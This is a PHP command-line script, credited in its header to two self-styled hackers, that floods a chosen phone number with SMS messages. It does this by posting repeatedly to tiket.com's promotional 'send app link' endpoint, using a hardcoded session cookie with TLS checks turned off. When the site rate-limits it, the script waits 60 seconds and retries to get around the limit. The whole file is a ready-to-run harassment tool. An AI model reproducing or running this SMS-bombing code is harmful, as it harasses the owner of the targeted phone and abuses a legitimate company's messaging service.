<?php

/* 
TIKET.COM Spam Code
C0ded by : Ardzz & Ilham HaX0r
Github Ilham HaX0r : https://github.com/ilhamhax0r
Github Ardzz : https://github.com/ardzz
Thank's to Ilham HaX0r
*/
$green  = "\e[92m";
$red    = "\e[91m";
$yellow = "\e[93m";
$blue   = "\e[36m";
system("clear");
sleep(2);
echo "$green+---------------[# TIKET.COM - SPAM SMS #]---------------+\n";
sleep(2);
echo "$green+----------------------[# Z0NK3X #]----------------------+\n";
echo "\nNO HP 		: ";
$no = trim(fgets(STDIN, 1024));
echo "\nCOUNT 		: ";
$loop = trim(fgets(STDIN, 1024));
echo "\n$blue+---------------------[# RESULT #]---------------------+\n";
$no = '62'.substr(trim($no), 1);
for ($x=1; $x<=$loop; $x++) {
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, "https://www.tiket.com/landing_page_promo/do_send_apps");
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_HTTPHEADER, array(
		'Cookie: device[type]=x; PHPSESSID=ws3pow_sl~6ob17r2j4u6dmm6om5fb0hb1qcj41tgj; tsct=aa8aa24c544133679efbea79f8625ba1; userlang=id; usercurrency=IDR; partner=%28default%29; __asc=a05cd407162d85dd317ff823c48; __auc=a05cd407162d85dd317ff823c48; _ga=GA1.2.447306633.1524048452; _gid=GA1.2.399265783.1524048452; _gat_webMonitor=1; _gat_UA-22317351-1=1; _vwo_uuid_v2=D7F96135E149C094293483AF39B69B5C8|d38ce67b5a5977195604805842be3250; scarab.visitor=%2236BFAE6CAD7A7842%22; cto_lwid=40e18b9b-4d91-4b52-bf8c-52d4d2ee2665; mp_0c9321f761e6801a5b23d3cda0855f9a_mixpanel=%7B%22distinct_id%22%3A%20%22162d85ddfd41c3-01abddcdda6685-3b7c015b-100200-162d85ddfd54de%22%2C%22%24initial_referrer%22%3A%20%22http%3A%2F%2Ftiket.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22tiket.com%22%7D; _uetsid=_uetb9f7562c',
	    'Upgrade-Insecure-Requests: 1',
	    'Origin: https://www.tiket.com',
	    'Accept-Encoding: gzip, deflate, br',
	    'Accept-Language: en-US,en;q=0.9',
	    'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
	    'Content-Type: application/x-www-form-urlencoded',
	    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	    'Referer: https://www.tiket.com',
	    'Connection: keep-alive'
	));
	curl_setopt($c, CURLOPT_POSTFIELDS,"send_no=".$no."&sent_type=phone&connection=sms");
	curl_setopt($c, CURLOPT_POST, 1);
	$hasil = curl_exec($c);
	//FUNGSI FALSE
	if ($hasil == "Too Many Requests") {
		$loop += 1;
		echo "\e[91m$x. Code failed to send :(\n\e[97mCount +1\n".($loop-$x)." remaining\n\e[93mSleep in 60s\n";
		flush();
		sleep(60);		
	} else {
		echo "$yellow   $x. NO HP : [ $no ] [ STATUS : SUCCESS ]    \n";
		flush();
		sleep(5);		
	}
}
echo "$green+------------------------------------------------------+\n";
echo "$red|      [#] Z0NK3X - BAC0DERS [#] [#] ilhamhax0r [#]    |\n";
echo "$green+------------------------------------------------------+\n";
?>
